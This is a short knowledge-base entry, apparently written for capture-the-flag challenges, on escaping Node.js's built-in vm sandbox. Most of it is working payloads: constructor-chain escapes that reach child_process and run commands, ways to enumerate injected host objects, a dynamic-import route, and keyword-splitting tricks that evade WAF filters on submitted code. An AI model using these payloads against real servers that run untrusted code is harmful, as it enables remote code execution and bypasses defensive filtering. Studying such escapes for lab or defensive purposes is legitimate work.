# node:vm sandbox escape (built-in `require('vm')`) — host-object leak family

Fingerprint: `require('vm')` / `vm.runInContext` / `new vm.Script(...)` in server source; errors are plain
`ReferenceError/TypeError`, NOT `VMError` (that's vm2 → see `kb-extra/vm2/`). No CVE to lean on: node:vm is a
**context, not a security mechanism** — the escape is always "find one host-realm object".

## Invariant
node:vm contextifies the sandbox globals, so objects you create inside are genuinely sandbox-realm — EXCEPT anything
the host passed in or leaked. Leak ONE host object `h` (a passed-in function/parameter, `console`, a host callback in
`options`, `require`d helper) → `h.constructor.constructor('return process')().mainModule.require('child_process')`.

## Vectors (proven on this platform's "online script execution" challenge)
1. `this` at sandbox top level may itself be host-bound:
   `this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()`
2. enumerate what the host injected into the context (`console.log(Object.getOwnPropertyNames(globalThis))`),
   take any injected function/object → same chain.
3. `vm.runInNewContext(code, sandbox)` — every value in `sandbox` is host-realm: `sandboxKey.constructor.constructor(...)`.
4. `options.importModuleDynamically` / `--experimental-vm-modules` enabled → `import('fs')` from sandbox directly
   (CVE-2023-37903-class misconfig; also check `process.mainModule` reachability first).

## Filter evasion (WAF/keyword on the submitted code string)
- `process` blocked → `''.constructor.constructor('return proc'+'ess')()`, `globalThis['proc'+'ess']`.
- `constructor` blocked → `[].__proto__['const'+'ructor']`, `(/x/)['const'+'ructor']`, bracket+concat everywhere.
- quotes blocked → `String.fromCharCode(...)` for the payload body; template literals.
- `eval`/`Function` blocked → dynamic `import('data:text/javascript,…')` (needs ESM), `setTimeout('code')`.
- `require` blocked → `process.mainModule.require` / `module.constructor._load('child_process')` (needs a module leak).

Output: `execSync(...).toString()` + `return`/`console.log` it — HTTP jails rarely relay server stdout.
Flag path via target convention (`/challenge/flag*`).
